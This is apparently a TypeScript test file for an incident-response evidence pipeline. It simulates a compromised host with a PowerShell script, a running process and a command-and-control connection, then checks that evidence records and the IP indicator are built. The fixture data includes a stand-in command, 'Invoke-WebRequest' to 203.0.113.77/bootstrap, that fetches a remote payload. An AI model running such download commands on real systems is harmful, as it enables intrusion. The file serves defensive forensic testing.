import {
  describe,
  expect,
  it,
} from "vitest";

import {
  collectAnalystEvidence,
  createAnalystCaseState,
} from "./analystCase";

import {
  buildCaseEvidenceRecords,
} from "./incidentCase";

import {
  createRangeArtifact,
} from "./rangeArtifact";

import {
  createRangeArtifactEvidenceEvent,
} from "./rangeArtifactEvent";

import {
  createSyntheticHostState,
  executeSyntheticHostCommand,
} from "./syntheticHost";

const host = createSyntheticHostState({
  deviceId: "device-fin-04",
  capabilities: [
    "read:filesystem",
    "read:network",
  ],
  files: [
    {
      path: "/Users/smartinez/AppData/Local/Temp/finance-update.ps1",
      content:
        "Invoke-WebRequest https://203.0.113.77/bootstrap",
      sha256:
        "abcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcd",
      owner: "smartinez",
      quarantined: false,
    },
  ],
  processes: [
    {
      pid: 8420,
      image: "powershell.exe",
      commandLine: "powershell.exe -File finance-update.ps1",
      state: "running",
    },
  ],
  network: {
    listeners: [],
    connections: [
      {
        id: "connection-c2",
        protocol: "tcp",
        localAddress: "10.20.30.44",
        localPort: 49714,
        remoteAddress: "203.0.113.77",
        remotePort: 443,
        state: "established",
        processId: 8420,
      },
    ],
  },
});

describe("Range artifact evidence bridge", () => {
  it("creates the artifact before a canonical evidence event and retains the snapshot", () => {
    const invocation = {
      id: "range-command-file",
      timestamp: "2026-08-21T05:00:01.000Z",
      command: {
        type: "read_file" as const,
        path: "/Users/smartinez/AppData/Local/Temp/finance-update.ps1",
      },
    };
    const execution = executeSyntheticHostCommand(
      host,
      invocation,
    );
    const artifact = createRangeArtifact({
      id: "range-command-file-artifact",
      acquiredAt: "2026-08-21T05:00:01.001Z",
      deviceId: host.deviceId,
      invocation,
      execution,
    });
    const event = createRangeArtifactEvidenceEvent({
      id: "range-command-file-evidence",
      timestamp: "2026-08-21T05:00:01.002Z",
      artifact,
    });

    expect(event.payload.artifactId).toBe(
      artifact.id,
    );
    expect(event.payload.sourceReference).toBe(
      "/Users/smartinez/AppData/Local/Temp/finance-update.ps1",
    );
    expect(event.payload.integrity).toEqual({
      status: "authored",
      algorithm: "sha256",
      value:
        "abcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcd",
    });
    expect(event.payload.artifact).toEqual(
      artifact,
    );

    if (
      event.payload.artifact?.kind !== "file" ||
      event.payload.artifact.snapshot.scope !== "single"
    ) {
      throw new Error("Expected embedded single-file artifact.");
    }

    expect(
      event.payload.artifact.snapshot.file.content,
    ).toContain("203.0.113.77/bootstrap");
  });

  it("projects artifact provenance and network indicators into Case", () => {
    const invocation = {
      id: "range-command-net",
      timestamp: "2026-08-21T05:00:02.000Z",
      command: {
        type: "list_network" as const,
      },
    };
    const execution = executeSyntheticHostCommand(
      host,
      invocation,
    );
    const artifact = createRangeArtifact({
      id: "range-command-net-artifact",
      acquiredAt: "2026-08-21T05:00:02.001Z",
      deviceId: host.deviceId,
      invocation,
      execution,
    });
    const event = createRangeArtifactEvidenceEvent({
      id: "range-command-net-evidence",
      timestamp: "2026-08-21T05:00:02.002Z",
      artifact,
    });
    const state = collectAnalystEvidence(
      createAnalystCaseState(),
      event.id,
      [event],
    );
    const records = buildCaseEvidenceRecords(
      state,
      [event],
    );

    expect(records).toEqual([
      expect.objectContaining({
        eventId: event.id,
        primaryTool: "range",
        artifact: {
          artifactId: artifact.id,
          sourceInvocationId: invocation.id,
          acquisitionMethod:
            "controlled_range_command",
          acquiredAt: artifact.acquiredAt,
          sourceReference: "network:state",
          integrity: {
            status: "unavailable",
            reason:
              "source_did_not_provide_integrity",
          },
        },
        indicators: expect.arrayContaining([
          {
            kind: "ip",
            value: "203.0.113.77",
          },
        ]),
      }),
    ]);
  });
});
